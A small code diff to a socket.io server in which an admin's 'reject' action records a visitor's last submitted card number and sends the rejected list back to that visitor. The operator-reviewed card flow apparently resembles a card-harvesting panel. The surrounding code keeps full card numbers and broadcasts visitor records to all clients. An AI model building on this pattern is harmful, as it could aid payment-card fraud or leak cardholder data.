@@ -703,6 +703,18 @@ io.on("connection", (socket) => {
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
+      // If reject, block the last submitted card number
+      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
+        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
+        if (lastCard && lastCard.cardNumber) {
+          if (!visitor.rejectedCards) visitor.rejectedCards = [];
+          if (!visitor.rejectedCards.includes(lastCard.cardNumber)) {
+            visitor.rejectedCards.push(lastCard.cardNumber);
+          }
+          // Send rejected cards list to client
+          io.to(visitorSocketId).emit("rejectedCards:list", visitor.rejectedCards);
+        }
+      }
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
